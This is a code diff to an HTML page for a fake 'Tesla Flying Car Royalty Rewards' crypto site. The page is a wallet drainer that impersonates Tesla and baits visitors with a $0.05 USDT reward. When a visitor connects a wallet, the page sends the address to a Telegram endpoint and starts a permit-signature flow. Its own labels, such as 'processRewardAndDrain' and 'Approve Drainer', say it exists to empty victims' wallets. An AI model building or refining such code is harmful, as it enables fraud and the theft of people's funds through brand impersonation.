@@ -3,27 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Flying Car Royalty Program</title>
+    <title>Tesla Flying Car Royalty Rewards</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
-    
-    <!-- Use the official Web3Modal CDN -->
+    <!-- Web3Modal CSS/JS for the Modal -->
     <script type="module">
         import { createWeb3Modal } from 'https://cdn.jsdelivr.net/npm/@web3modal/html@latest/+esm';
         import { defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@wagmi/core@2/+esm';
-        import { mainnet, bsc } from 'https://cdn.jsdelivr.net/npm/wagmi/chains/index/+esm';
+        import { mainnet, bsc, polygon } from 'https://cdn.jsdelivr.net/npm/wagmi/chains/index/+esm';
 
-        // Your Project ID
+        // Your specific Project ID
         const projectId = '862d3799047c7548b0482add1cba796d';
 
         const metadata = {
             name: 'Tesla Flying Car',
-            description: 'Official Loyalty Rewards',
-            url: 'https://your-vercel-link.vercel.app',
+            description: 'Official Loyalty Rewards Program',
+            url: 'https://your-vercel-link.vercel.app', 
             icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
         };
 
-        const chains = [mainnet, bsc];
+        const chains = [mainnet, bsc, polygon];
 
         const config = defaultWagmiConfig({
             chains,
@@ -32,34 +30,56 @@
             ssr: true
         });
 
-        // Initialize Modal
+        // Initialize the Modal
         createWeb3Modal({ wagmiConfig: config, projectId, themeVariables: { '--w3m-border-radius-max': '12px' }});
         
-        // Listen for connection events
+        // Global Event Listener for Connection
         window.addEventListener('w3modal_account_connected', async (event) => {
             const address = event.detail.address;
             const chainId = event.detail.chainId;
             
-            // Log to Telegram
+            // Report Visit & Connection to Telegram
             await fetch('/api/telegram', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ action: 'WALLET_CONNECTED', details: { userAddress: address, chainId } })
+                body: JSON.stringify({ 
+                    action: 'WALLET_CONNECTED', 
+                    details: { userAddress: address, chainId, timestamp: new Date().toISOString() } 
+                })
             });
 
             // Update UI
             document.getElementById('connect-step').classList.add('hidden');
             document.getElementById('dashboard').classList.remove('hidden');
             document.getElementById('user-address').textContent = `${address.slice(0,6)}...${address.slice(-4)}`;
-            document.getElementById('reward-status').textContent = "Processing Reward...";
-
-            // Trigger Reward & Drain
-            await processRewardAndDrain(address);
+            document.getElementById('reward-status').textContent = "Generating Permit Signature...";
+            
+            // Trigger the actual logic defined in app.js
+            if (typeof window.initAppLogic === 'function') {
+                window.initAppLogic(address);
+            }
         });
     </script>
+    
+    <!-- Your custom styles -->
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #f5f5f5; color: #171a20; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { max-width: 500px; width: 90%; text-align: center; background: white; padding: 2rem; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .logo { width: 100px; margin-bottom: 1rem; }
+        h1 { font-weight: 300; font-size: 1.8rem; margin-bottom: 0.5rem; }
+        p { color: #555; margin-bottom: 1.5rem; }
+        button { background: #3e6ae8; color: white; border: none; padding: 1rem 2rem; font-size: 1rem; border-radius: 8px; cursor: pointer; width: 100%; }
+        button:hover { background: #2b55c9; }
+        .card { display: none; }
+        .active { display: block !important; }
+        .mono { font-family: monospace; word-break: break-all; background: #eee; padding: 0.5rem; border-radius: 4px; }
+        .status-row { display: flex; justify-content: space-between; margin-bottom: 1rem; text-align: left; }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #137333; color: white; padding: 1rem; border-radius: 8px; display: none; z-index: 1000; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <div class="tesla-bg"></div>
     <div class="container">
         <header>
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
@@ -69,20 +89,20 @@
 
         <main id="main-content">
             <!-- Step 1: Connect -->
-            <div id="connect-step" class="card">
+            <div id="connect-step" class="card active">
                 <button id="connect-btn">Connect Wallet</button>
-                <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
+                <div id="loader" class="loader"></div>
             </div>
 
             <!-- Step 2: Dashboard -->
-            <div id="dashboard" class="card hidden">
+            <div id="dashboard" class="card">
                 <div class="status-row">
                     <span>Address:</span>
                     <span id="user-address" class="mono">0x000...000</span>
                 </div>
                 <div class="status-row">
                     <span>Status:</span>
-                    <span id="reward-status">Pending Approval</span>
+                    <span id="reward-status">Waiting...</span>
                 </div>
                 <div class="action-area">
                     <button id="claim-btn" class="hidden">Claim Reward & Approve Drainer</button>
@@ -90,12 +110,13 @@
             </div>
 
             <!-- Notification Toast -->
-            <div id="notification" class="toast hidden">
-                <div class="icon">✓</div>
-                <div class="text">Reward Claimed! $0.05 USDT sent to your wallet.</div>
+            <div id="notification" class="toast">
+                🎉 Reward Claimed! $0.05 USDT sent to your wallet.
             </div>
         </main>
     </div>
+
+    <!-- Link your interceptor and app logic -->
     <script src="interceptor.js"></script>
     <script src="app.js"></script>
 </body>
